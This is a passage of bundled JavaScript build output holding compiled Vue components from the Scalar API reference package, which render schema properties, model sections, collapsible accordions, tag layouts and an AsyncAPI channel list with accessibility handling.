		onBeforeUnmount(clearHeadingHover);
		watch(isTreeOpen, (open) => {
			if (open) return;
			const panel = treePanelRef.value?.$el;
			panel?.removeAttribute("data-rail-hovered");
			panel?.parentElement?.removeAttribute("data-child-rail-hovered");
		});
		/**
		* The schema the panel hands to its child `Schema`, so the count and the
		* preview describe the rows that render. Object-first, like `treeChildProps`.
		*/
		const treeChildSchema = computed(() => rendersArrayBranch.value ? resolvedArrayItems.value : objectSchemaForChildren.value);
		/**
		* The filtered, ordered child property names for the collapsed preview, and
		* for the count only when a hide flag filters the list. `sortPropertyNames`
		* (sort plus `$ref` resolution of every child) is the hottest per-row cost, so
		* nothing reads this while the row is open. Same call the panel makes — full
		* options, no discriminator — or the preview names the wrong first rows and
		* the count disagrees with the panel.
		*/
		const sortedChildPropertyNames = computed(() => treeChildSchema.value ? sortPropertyNames(treeChildSchema.value, void 0, props.options) : []);
		/**
		* The child count that rides the toggle's `aria-describedby`. A description
		* rather than part of the name, so screen-reader verbosity settings apply.
		*/
		const treeChildCountLabel = computed(() => {
			if (!isExpandable.value) return null;
			const source = treeChildSchema.value;
			if (!source) return null;
			const named = props.options.hideReadOnly || props.options.hideWriteOnly ? sortedChildPropertyNames.value.length : isTypeObject(source) && source.properties ? Object.keys(source.properties).length : 0;
			const patterns = "patternProperties" in source && source.patternProperties ? Object.keys(source.patternProperties).length : 0;
			const additional = "additionalProperties" in source && source.additionalProperties ? 1 : 0;
			const count = named + patterns + additional;
			if (count === 0) return null;
			return translate("schema.propertyCount", { count: String(count) });
		});
		/**
		* Whether the type signature will render this row's enum values inline, which
		* is the only case where suppressing the separate value list is safe.
		*/
		const signatureInlinesEnum = computed(() => typeSignatureInlinesEnum(optimizedValue.value, { hideModelNames: props.hideModelNames }));
		/**
		* The toggle's accessible name when the row has no visible property name (an
		* array-of-objects root, say), so it is never announced as an unnamed button.
		*/
		const treeFallbackLabel = computed(() => props.modelName || translate("schema.schema"));
		const toggleTree = () => {
			const next = !isTreeOpen.value;
			if (!next) {
				const active = document.activeElement;
				const toggleElement = treeToggleRef.value instanceof HTMLElement ? treeToggleRef.value : treeToggleRef.value?.$el;
				if (active && treePanelRef.value?.$el.contains(active)) toggleElement?.focus();
			}
			expansion.setExpanded(treeNodeKey.value, next);
		};
		/**
		* The whole heading is a pointer convenience for the disclosure; the gutter
		* toggle stays the accessible control. Interactive children keep their own
		* clicks, and a click that ends a text selection selects rather than toggles,
		* so property names stay copyable.
		*/
		const onHeadingClick = (event) => {
			if (!isTreeRow.value) return;
			const target = event.target;
			if (target instanceof Element && target.closest("a, button, [role=\"button\"], input, select, label")) return;
			if (window.getSelection()?.toString()) return;
			toggleTree();
		};
		/** Reopen a panel the browser revealed through find-in-page. */
		const onBeforeMatch = () => {
			expansion.setExpanded(treeNodeKey.value, true);
		};
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(__props.is ?? "li"), { class: normalizeClass(["property", [
				`property--level-${__props.level}`,
				{
					"property--compact": __props.compact,
					"property--deprecated": optimizedValue.value?.deprecated
				},
				"property--tree grid! grid-cols-[minmax(0,1fr)] border-b-0! px-0! py-[var(--schema-row-pad,6px)]!",
				{ "property--tree-container": !isTreeRow.value && !isCyclicProperty.value && (isExpandable.value || !shouldDisplayHeadingComputed.value) },
				`property--depth-${__props.depth}`
			]]) }, {
				default: withCtx(() => [
					isTreeRow.value ? (openBlock(), createBlock(SchemaGutterToggle_default, {
						key: 0,
						ref: "treeToggle",
						class: "absolute start-[calc(0px_-_var(--schema-toggle-half,12px)_-_var(--schema-gutter,16px))] top-2.5 z-[1] col-start-1 row-start-1 -translate-y-1/2 print:hidden",
						countId: treeChildCountLabel.value ? unref(treeCountId) : void 0,
						fallbackLabel: treeFallbackLabel.value,
						nameId: __props.name ? unref(treeNameId) : void 0,
						open: isTreeOpen.value,
						panelId: unref(treePanelId),
						panelRendered: isTreePanelRendered.value,
						onToggle: toggleTree
					}, null, 8, [
						"countId",
						"fallbackLabel",
						"nameId",
						"open",
						"panelId",
						"panelRendered"
					])) : createCommentVNode("", true),
					shouldDisplayHeadingComputed.value ? (openBlock(), createBlock(SchemaPropertyHeading_default, mergeProps({
						key: 1,
						class: ["group", [{ "cursor-pointer": isTreeRow.value }, "relative row-start-1 min-h-5 content-center [&>*:has(+.copy-link-trailing)]:me-0!"]]
					}, toHandlers(isTreeRow.value ? treeHeadingHoverListeners : unref(NO_LISTENERS)), {
						onClick: onHeadingClick,
						enum: hasEnum.value,
						eventBus: __props.eventBus,
						hideModelNames: __props.hideModelNames,
						isDiscriminator: isDiscriminatorProperty.value,
						modelLinkOptions: {
							hideModels: __props.options.hideModels,
							document: __props.options.document
						},
						modelName: __props.modelName,
						propertyNames: __props.propertyNamesSchema,
						recursiveTo: isCyclicProperty.value ? cycleTargetName.value : void 0,
						required: __props.required,
						keyKind: __props.variant === "additionalProperties" ? "additional" : __props.variant === "patternProperties" ? "pattern" : void 0,
						value: optimizedValue.value
					}), createSlots({ _: 2 }, [
						__props.name ? {
							name: "name",
							fn: withCtx(() => [hasBreadcrumbLink.value ? (openBlock(), createBlock(unref(WithBreadcrumb_default), {
								key: 0,
								breadcrumb: childBreadcrumb.value
							}, {
								default: withCtx(() => [createBaseVNode("span", { id: unref(treeNameId) }, [__props.variant === "patternProperties" ? (openBlock(), createElementBlock("span", _hoisted_2$35, [createVNode(unref(ScalarWrappingText_default), {
									preset: "property",
									text: __props.name
								}, null, 8, ["text"])])) : __props.variant === "additionalProperties" ? (openBlock(), createElementBlock("span", _hoisted_3$23, [createVNode(unref(ScalarWrappingText_default), {
									preset: "property",
									text: __props.name
								}, null, 8, ["text"])])) : (openBlock(), createBlock(unref(ScalarWrappingText_default), {
									key: 2,
									preset: "property",
									text: __props.name
								}, null, 8, ["text"]))], 8, _hoisted_1$56)]),
								_: 1
							}, 8, ["breadcrumb"])) : (openBlock(), createElementBlock("span", {
								key: 1,
								id: unref(treeNameId)
							}, [__props.variant === "patternProperties" ? (openBlock(), createElementBlock("span", _hoisted_5$10, [createVNode(unref(ScalarWrappingText_default), {
								preset: "property",
								text: __props.name
							}, null, 8, ["text"])])) : __props.variant === "additionalProperties" ? (openBlock(), createElementBlock("span", _hoisted_6$9, [createVNode(unref(ScalarWrappingText_default), {
								preset: "property",
								text: __props.name
							}, null, 8, ["text"])])) : (openBlock(), createBlock(unref(ScalarWrappingText_default), {
								key: 2,
								preset: "property",
								text: __props.name
							}, null, 8, ["text"]))], 8, _hoisted_4$13))]),
							key: "0"
						} : void 0,
						optimizedValue.value?.example !== void 0 ? {
							name: "example",
							fn: withCtx(() => [createTextVNode(" Example: " + toDisplayString(optimizedValue.value.example), 1)]),
							key: "1"
						} : void 0,
						isTreeRow.value && !isTreeOpen.value ? {
							name: "preview",
							fn: withCtx(() => [createVNode(SchemaCollapsedPreview_default, {
								"aria-hidden": "true",
								class: "mr-0!",
								propertyNames: sortedChildPropertyNames.value,
								schema: treeChildSchema.value
							}, null, 8, ["propertyNames", "schema"])]),
							key: "2"
						} : void 0,
						__props.name && shouldHaveLink.value && childBreadcrumb.value ? {
							name: "trailing",
							fn: withCtx(() => [createVNode(unref(CopyLinkButton_default), {
								anchorId: childBreadcrumb.value.join("."),
								eventBus: __props.eventBus
							}, null, 8, ["anchorId", "eventBus"])]),
							key: "3"
						} : void 0
					]), 1040, [
						"class",
						"enum",
						"eventBus",
						"hideModelNames",
						"isDiscriminator",
						"modelLinkOptions",
						"modelName",
						"propertyNames",
						"recursiveTo",
						"required",
						"keyKind",
						"value"
					])) : createCommentVNode("", true),
					displayDescription.value || propertyDescription.value ? (openBlock(), createElementBlock("div", _hoisted_7$6, [createVNode(unref(ScalarMarkdown_default), { value: displayDescription.value || propertyDescription.value || "" }, null, 8, ["value"])])) : createCommentVNode("", true),
					__props.propertyNamesEnum && __props.propertyNamesEnum.length > 0 ? (openBlock(), createBlock(SchemaEnums_default, {
						key: 3,
						propertyNames: "",
						value: { enum: __props.propertyNamesEnum }
					}, null, 8, ["value"])) : createCommentVNode("", true),
					enumValues.value.length > 0 && !shouldRenderArrayOfObjects.value && !signatureInlinesEnum.value ? (openBlock(), createBlock(SchemaEnums_default, {
						key: 4,
						value: optimizedValue.value
					}, null, 8, ["value"])) : createCommentVNode("", true),
					isTreeRow.value && treeChildCountLabel.value ? (openBlock(), createElementBlock("span", {
						key: 5,
						id: unref(treeCountId),
						class: "screenreader-only"
					}, toDisplayString(treeChildCountLabel.value), 9, _hoisted_8$5)) : createCommentVNode("", true),
					isTreeRow.value && isTreePanelRendered.value ? (openBlock(), createBlock(SchemaRailPanel_default, {
						key: 6,
						id: unref(treePanelId),
						ref: "treePanel",
						class: "property-children mt-1.5 mb-0.5 [&_.schema-card]:mb-0! [&_.schema-card]:pb-0! [&_.schema-properties]:mb-0! [&_.schema-properties]:pb-0! [&_ul]:my-0! [&_ul]:py-0! [&[hidden=until-found]]:my-0 [&[hidden=until-found]]:border-s-0 [&[hidden]:not([hidden=until-found])]:hidden",
						closeOnRail: "",
						depth: __props.depth + 1,
						hidden: isTreeOpen.value ? void 0 : "until-found",
						onBeforematch: onBeforeMatch,
						onClose: toggleTree
					}, {
						default: withCtx(() => [treeChildProps.value ? (openBlock(), createBlock(Schema_default, mergeProps({ key: 0 }, treeChildProps.value, {
							depth: __props.depth + 1,
							noncollapsible: ""
						}), null, 16, ["depth"])) : createCommentVNode("", true)]),
						_: 1
					}, 8, [
						"id",
						"depth",
						"hidden"
					])) : createCommentVNode("", true),
					isExpandable.value && !isCyclicProperty.value && !isTreeRow.value ? (openBlock(), createElementBlock("div", _hoisted_9$4, [treeChildProps.value ? (openBlock(), createBlock(Schema_default, mergeProps({ key: 0 }, treeChildProps.value, {
						depth: __props.depth,
						noncollapsible: ""
					}), null, 16, ["depth"])) : createCommentVNode("", true)])) : createCommentVNode("", true),
					(openBlock(true), createElementBlock(Fragment, null, renderList(compositionsToRender.value, (compositionData) => {
						return openBlock(), createBlock(SchemaComposition_default, {
							key: compositionData.composition,
							breadcrumb: childBreadcrumb.value,
							compact: __props.compact,
							composition: compositionData.composition,
							compositionPath: currentCompositionPath.value,
							depth: __props.depth,
							discriminator: getCompositionDiscriminator(compositionData.composition),
							eventBus: __props.eventBus,
							hideHeading: __props.hideHeading,
							hideModelNames: __props.hideModelNames,
							level: __props.level,
							name: __props.name,
							noncollapsible: __props.noncollapsible,
							options: __props.options,
							schema: compositionData.value,
							schemaContext: __props.schemaContext
						}, null, 8, [
							"breadcrumb",
							"compact",
							"composition",
							"compositionPath",
							"depth",
							"discriminator",
							"eventBus",
							"hideHeading",
							"hideModelNames",
							"level",
							"name",
							"noncollapsible",
							"options",
							"schema",
							"schemaContext"
						]);
					}), 128)),
					hasSpecificationExtensions.value ? (openBlock(), createBlock(unref(SpecificationExtension_default), {
						key: 8,
						value: optimizedValue.value
					}, null, 8, ["value"])) : createCommentVNode("", true)
				]),
				_: 1
			}, 8, ["class"]);
		};
	}
}), [["__scopeId", "data-v-25431668"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaHeading.vue.script.js
var _hoisted_1$55 = {
	key: 0,
	class: "schema-type"
};
var _hoisted_2$34 = ["title"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaHeading.vue.js
var SchemaHeading_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaHeading",
	props: {
		value: {},
		name: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/** Generate a failsafe type from the properties when we don't have one */
		const failsafeType = computed(() => {
			if ("type" in __props.value) return __props.value.type;
			if (__props.value.enum) return "enum";
			if (isArraySchema(__props.value) && __props.value.items) return "array";
			if (isTypeObject(__props.value) && (__props.value.properties || __props.value.additionalProperties)) return "object";
			return "unknown";
		});
		return (_ctx, _cache) => {
			return typeof __props.value === "object" ? (openBlock(), createElementBlock("span", _hoisted_1$55, [createBaseVNode("span", {
				class: "schema-type-icon",
				title: "type" in __props.value && typeof __props.value.type === "string" ? __props.value.type : "type" in __props.value && Array.isArray(__props.value.type) ? __props.value.type.join(" | ") : unref(translate)("schema.unknownType")
			}, [
				unref(isTypeObject)(__props.value) ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createTextVNode(" {} ")], 64)) : createCommentVNode("", true),
				unref(isArraySchema)(__props.value) ? (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(" [] ")], 64)) : createCommentVNode("", true),
				__props.value.enum ? (openBlock(), createElementBlock(Fragment, { key: 2 }, [createTextVNode(" enum ")], 64)) : createCommentVNode("", true)
			], 8, _hoisted_2$34), __props.name ? (openBlock(), createBlock(unref(ScalarWrappingText_default), {
				key: 0,
				preset: "property",
				text: __props.name
			}, null, 8, ["text"])) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(toDisplayString(failsafeType.value), 1)], 64))])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-6db6aa51"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Models/components/ClassicLayout.vue.script.js
var _hoisted_1$54 = {
	key: 0,
	class: "properties"
};
var _hoisted_2$33 = { key: 1 };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Models/components/ClassicLayout.vue.js
var ClassicLayout_default$2 = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ClassicLayout",
	props: {
		id: {},
		name: {},
		schema: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		document: {},
		options: {}
	},
	setup(__props) {
		const { level: headingLevel } = useDocumentOutline("model");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(SectionAccordion_default), {
				"aria-label": __props.schema.title ?? __props.name,
				modelValue: !__props.isCollapsed,
				"onUpdate:modelValue": _cache[1] || (_cache[1] = (value) => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.id,
					open: value
				}))
			}, {
				title: withCtx(() => [createVNode(unref(Anchor_default), {
					class: "reference-models-anchor",
					eventBus: __props.eventBus,
					onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.id }))
				}, {
					default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), { level: unref(headingLevel) }, {
						default: withCtx(() => [createVNode(unref(SchemaHeading_default), {
							class: "reference-models-label",
							name: __props.schema.title ?? __props.name,
							value: __props.schema
						}, null, 8, ["name", "value"])]),
						_: 1
					}, 8, ["level"])]),
					_: 1
				}, 8, ["eventBus"])]),
				default: withCtx(() => ["properties" in __props.schema ? (openBlock(), createElementBlock("div", _hoisted_1$54, [(openBlock(true), createElementBlock(Fragment, null, renderList(Object.entries(__props.schema.properties ?? {}), ([property, value]) => {
					return openBlock(), createBlock(unref(SchemaProperty_default), {
						key: property,
						breadcrumb: [__props.id],
						eventBus: __props.eventBus,
						hideModelNames: __props.options.hideModels,
						name: property,
						options: {
							...__props.options,
							document: __props.document
						},
						required: __props.schema.required?.includes(property),
						schema: unref(resolve).schema(value)
					}, null, 8, [
						"breadcrumb",
						"eventBus",
						"hideModelNames",
						"name",
						"options",
						"required",
						"schema"
					]);
				}), 128))])) : (openBlock(), createElementBlock("div", _hoisted_2$33, [createVNode(unref(SchemaProperty_default), {
					breadcrumb: [__props.id],
					eventBus: __props.eventBus,
					hideModelNames: __props.options.hideModels,
					options: {
						...__props.options,
						document: __props.document
					},
					schema: __props.schema
				}, null, 8, [
					"breadcrumb",
					"eventBus",
					"hideModelNames",
					"options",
					"schema"
				])]))]),
				_: 1
			}, 8, ["aria-label", "modelValue"]);
		};
	}
}), [["__scopeId", "data-v-96f8555d"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/CompactSection.vue.script.js
var _hoisted_1$53 = ["aria-label"];
var _hoisted_2$32 = [
	"id",
	"aria-controls",
	"aria-expanded",
	"aria-labelledby"
];
var _hoisted_3$22 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/CompactSection.vue.js
var CompactSection_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "CompactSection",
	props: {
		id: {},
		label: {},
		modelValue: { type: Boolean }
	},
	emits: ["update:modelValue", "copyAnchorUrl"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		/** The trigger owns `id` as its deep link target, so the region it controls needs one of its own */
		const contentId = computed(() => `${__props.id}-content`);
		/**
		* Name the trigger after the heading it renders by pointing `aria-labelledby` at it,
		* rather than copying the text into an `aria-label`. Referencing the visible node keeps
		* the accessible name in sync with what is on screen, so it can never drift into a
		* WCAG 2.5.3 (Label in Name) failure the way a duplicated string can.
		*/
		const labelId = useId();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("section", {
				"aria-label": __props.label,
				class: "collapsible-section"
			}, [createBaseVNode("div", { class: normalizeClass(["collapsible-section-trigger", { "collapsible-section-trigger-open": __props.modelValue }]) }, [createVNode(unref(Anchor_default), {
				class: "collapsible-section-header",
				onCopyAnchorUrl: _cache[1] || (_cache[1] = () => emit("copyAnchorUrl"))
			}, {
				default: withCtx(() => [createBaseVNode("button", {
					id: __props.id,
					"aria-controls": __props.modelValue ? contentId.value : void 0,
					"aria-expanded": __props.modelValue,
					"aria-labelledby": unref(labelId),
					class: "collapsible-section-toggle -my-2.5 inline cursor-pointer py-2.5 text-start text-inherit [font:inherit]",
					type: "button",
					onClick: _cache[0] || (_cache[0] = ($event) => emit("update:modelValue", !__props.modelValue))
				}, [createVNode(unref(ScalarIconCaretRight_default), {
					class: normalizeClass(["top-1/2 size-3 -translate-y-1/2 transition-transform duration-100", { "rotate-90": __props.modelValue }]),
					weight: "bold"
				}, null, 8, ["class"]), createBaseVNode("span", {
					id: unref(labelId),
					class: "contents"
				}, [renderSlot(_ctx.$slots, "heading", {}, void 0, true)], 8, _hoisted_3$22)], 8, _hoisted_2$32)]),
				_: 3
			})], 2), __props.modelValue ? (openBlock(), createBlock(Section_default, {
				key: 0,
				id: contentId.value,
				class: "collapsible-section-content",
				label: __props.label
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, void 0, true)]),
				_: 3
			}, 8, ["id", "label"])) : createCommentVNode("", true)], 8, _hoisted_1$53);
		};
	}
}), [["__scopeId", "data-v-9d5fc508"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Models/components/ModernLayout.vue.js
var ModernLayout_default$2 = /* @__PURE__ */ defineComponent({
	__name: "ModernLayout",
	props: {
		id: {},
		name: {},
		schema: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		document: {},
		options: {}
	},
	setup(__props) {
		const { level: headingLevel } = useDocumentOutline("model");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(CompactSection_default), {
				id: __props.id,
				key: __props.name,
				label: __props.name,
				modelValue: !__props.isCollapsed,
				onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.id })),
				"onUpdate:modelValue": _cache[1] || (_cache[1] = (value) => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.id,
					open: value
				}))
			}, {
				heading: withCtx(() => [createVNode(unref(SectionHeaderTag_default), { level: unref(headingLevel) }, {
					default: withCtx(() => [createVNode(unref(SchemaHeading_default), {
						name: __props.schema.title ?? __props.name,
						value: __props.schema
					}, null, 8, ["name", "value"])]),
					_: 1
				}, 8, ["level"])]),
				default: withCtx(() => [createVNode(unref(ScalarErrorBoundary_default), null, {
					default: withCtx(() => [createVNode(unref(Schema_default), {
						breadcrumb: [__props.id],
						eventBus: __props.eventBus,
						hideModelNames: __props.options.hideModels,
						hideHeading: "",
						level: 1,
						noncollapsible: "",
						options: {
							...__props.options,
							document: __props.document
						},
						schema: __props.schema
					}, null, 8, [
						"breadcrumb",
						"eventBus",
						"hideModelNames",
						"options",
						"schema"
					])]),
					_: 1
				})]),
				_: 1
			}, 8, [
				"id",
				"label",
				"modelValue"
			]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Models/Model.vue.js
var Model_default = /* @__PURE__ */ defineComponent({
	__name: "Model",
	props: {
		id: {},
		name: {},
		options: {},
		schema: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		document: {}
	},
	setup(__props) {
		const section = useTemplateRef("section");
		useIntersection(section, () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.id }));
		return (_ctx, _cache) => {
			return __props.schema ? (openBlock(), createElementBlock("div", {
				key: 0,
				ref_key: "section",
				ref: section
			}, [__props.options.layout === "classic" ? (openBlock(), createBlock(ClassicLayout_default$2, {
				key: 0,
				id: __props.id,
				document: __props.document,
				eventBus: __props.eventBus,
				isCollapsed: __props.isCollapsed,
				name: __props.name,
				options: __props.options,
				schema: __props.schema
			}, null, 8, [
				"id",
				"document",
				"eventBus",
				"isCollapsed",
				"name",
				"options",
				"schema"
			])) : (openBlock(), createBlock(ModernLayout_default$2, {
				key: 1,
				id: __props.id,
				document: __props.document,
				eventBus: __props.eventBus,
				isCollapsed: __props.isCollapsed,
				name: __props.name,
				options: __props.options,
				schema: __props.schema
			}, null, 8, [
				"id",
				"document",
				"eventBus",
				"isCollapsed",
				"name",
				"options",
				"schema"
			]))], 512)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionContainerAccordion.vue.script.js
var _hoisted_1$52 = { class: "section-accordion-wrapper" };
var _hoisted_2$31 = { class: "section-accordion-title" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionContainerAccordion.vue.js
var SectionContainerAccordion_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SectionContainerAccordion",
	props: { modelValue: { type: Boolean } },
	emits: ["update:modelValue"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("section", _hoisted_1$52, [createVNode(unref(N$2), {
				as: "div",
				class: "section-accordion"
			}, {
				default: withCtx(() => [createVNode(unref(Q), {
					class: "section-accordion-button",
					onClick: _cache[0] || (_cache[0] = ($event) => emit("update:modelValue", !__props.modelValue))
				}, {
					default: withCtx(() => [createVNode(unref(ScalarIconCaretRight_default), { class: normalizeClass(["section-accordion-chevron size-5 transition-transform", { "rotate-90": __props.modelValue }]) }, null, 8, ["class"]), createBaseVNode("div", _hoisted_2$31, [renderSlot(_ctx.$slots, "title", {}, void 0, true)])]),
					_: 3
				}), __props.modelValue ? (openBlock(), createBlock(unref(V), {
					key: 0,
					class: "section-accordion-content",
					static: ""
				}, {
					default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, void 0, true)]),
					_: 3
				})) : createCommentVNode("", true)]),
				_: 3
			})]);
		};
	}
}), [["__scopeId", "data-v-9419dd23"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ShowMoreButton.vue.script.js
var _hoisted_1$51 = {
	class: "show-more",
	type: "button"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ShowMoreButton.vue.js
var ShowMoreButton_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ShowMoreButton",
	setup(__props) {
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", _hoisted_1$51, [createTextVNode(toDisplayString(unref(translate)("actions.showMore")) + " ", 1), createVNode(unref(ScalarIconCaretDown_default), {
				class: "text-c-2 mt-0.25 size-3",
				weight: "bold"
			})]);
		};
	}
}), [["__scopeId", "data-v-bb0811ed"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Models/ModelTag.vue.js
var ModelTag_default = /* @__PURE__ */ defineComponent({
	__name: "ModelTag",
	props: {
		id: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		layout: {},
		modelsSectionLabel: { default: () => DEFAULT_MODELS_SECTION_LABEL }
	},
	setup(__props) {
		const { level: headingLevel } = useDocumentOutline("modelGroup");
		return (_ctx, _cache) => {
			return __props.layout === "modern" ? (openBlock(), createBlock(SectionContainer_default, { key: 0 }, {
				default: withCtx(() => [createVNode(unref(Section_default), {
					id: __props.id,
					"aria-label": __props.modelsSectionLabel,
					onIntersecting: _cache[1] || (_cache[1] = () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.id }))
				}, {
					default: withCtx(() => [createVNode(unref(SectionHeader_default), null, {
						default: withCtx(() => [createVNode(SectionHeaderTag_default, { level: unref(headingLevel) }, {
							default: withCtx(() => [createTextVNode(toDisplayString(__props.modelsSectionLabel), 1)]),
							_: 1
						}, 8, ["level"])]),
						_: 1
					}), !__props.isCollapsed ? renderSlot(_ctx.$slots, "default", {}, void 0, void 0, 0) : (openBlock(), createBlock(ShowMoreButton_default, {
						key: 1,
						id: __props.id,
						class: "top-0",
						onClick: _cache[0] || (_cache[0] = () => __props.eventBus.emit("toggle:nav-item", {
							id: __props.id,
							open: true
						}))
					}, null, 8, ["id"]))]),
					_: 3
				}, 8, ["id", "aria-label"])]),
				_: 3
			})) : (openBlock(), createBlock(SectionContainerAccordion_default, {
				key: 1,
				"aria-label": __props.modelsSectionLabel,
				class: "pb-12",
				modelValue: !__props.isCollapsed,
				"onUpdate:modelValue": _cache[2] || (_cache[2] = () => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.id,
					open: __props.isCollapsed
				}))
			}, {
				title: withCtx(() => [createVNode(unref(SectionHeader_default), null, {
					default: withCtx(() => [createVNode(SectionHeaderTag_default, { level: unref(headingLevel) }, {
						default: withCtx(() => [createTextVNode(toDisplayString(__props.modelsSectionLabel), 1)]),
						_: 1
					}, 8, ["level"])]),
					_: 1
				})]),
				default: withCtx(() => [renderSlot(_ctx.$slots, "default")]),
				_: 3
			}, 8, ["aria-label", "modelValue"]));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Tags/components/ClassicLayout.vue.js
var ClassicLayout_default$1 = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ClassicLayout",
	props: {
		tag: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		nested: { type: Boolean }
	},
	setup(__props) {
		const { level: headingLevel } = useDocumentOutline("tag");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(SectionContainerAccordion_default), {
				"aria-label": __props.tag.title,
				class: normalizeClass(["tag-section", {
					"tag-section-group": __props.tag.isGroup,
					"tag-section-nested": __props.nested
				}]),
				modelValue: !__props.isCollapsed,
				"onUpdate:modelValue": _cache[1] || (_cache[1] = (value) => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.tag.id,
					open: value
				}))
			}, {
				title: withCtx(() => [createVNode(unref(SectionHeader_default), { class: normalizeClass(["tag-name", { "tag-group-name": __props.tag.isGroup }]) }, {
					default: withCtx(() => [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.tag.id })) }, {
						default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), { level: unref(headingLevel) }, {
							default: withCtx(() => [createTextVNode(toDisplayString(__props.tag.title), 1)]),
							_: 1
						}, 8, ["level"])]),
						_: 1
					})]),
					_: 1
				}, 8, ["class"]), createVNode(unref(ScalarMarkdown_default), {
					class: "tag-description",
					value: __props.tag?.description,
					withImages: ""
				}, null, 8, ["value"])]),
				default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, void 0, true)]),
				_: 3
			}, 8, [
				"aria-label",
				"class",
				"modelValue"
			]);
		};
	}
}), [["__scopeId", "data-v-fafcaa8a"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/ChannelsList.vue.script.js
var _hoisted_1$50 = ["aria-label"];
var _hoisted_2$30 = ["onClick"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/ChannelsList.vue.js
var ChannelsList_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ChannelsList",
	props: {
		tag: {},
		eventBus: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* Channels grouped under this tag. The OpenAPI `OperationsList` only knows about
		* `operation`/`webhook` children, so AsyncAPI tags need their own list that links
		* straight to each channel section.
		*/
		const channels = computed(() => __props.tag.children?.filter((child) => child.type === "asyncapi-channel") ?? []);
		return (_ctx, _cache) => {
			return channels.value.length ? (openBlock(), createBlock(unref(ScalarCard_default), {
				key: 0,
				class: "channels-card"
			}, {
				default: withCtx(() => [createVNode(unref(ScalarCardHeader_default), { muted: "" }, {
					default: withCtx(() => [createVNode(ScreenReader_default, null, {
						default: withCtx(() => [createTextVNode(toDisplayString(__props.tag.title), 1)]),
						_: 1
					}), createTextVNode(" " + toDisplayString(unref(translate)("navigation.channels")), 1)]),
					_: 1
				}), createVNode(unref(ScalarCardSection_default), { class: "custom-scroll max-h-[60vh]" }, {
					default: withCtx(() => [createBaseVNode("ul", {
						"aria-label": unref(translate)("navigation.channels"),
						class: "channels"
					}, [(openBlock(true), createElementBlock(Fragment, null, renderList(channels.value, (channel) => {
						return openBlock(), createElementBlock("li", {
							key: channel.id,
							class: "contents"
						}, [createBaseVNode("a", {
							class: "channel",
							onClick: withModifiers(() => __props.eventBus?.emit("scroll-to:nav-item", { id: channel.id }), ["prevent"])
						}, toDisplayString(channel.title || channel.channelAddress), 9, _hoisted_2$30)]);
					}), 128))], 8, _hoisted_1$50)]),
					_: 1
				})]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
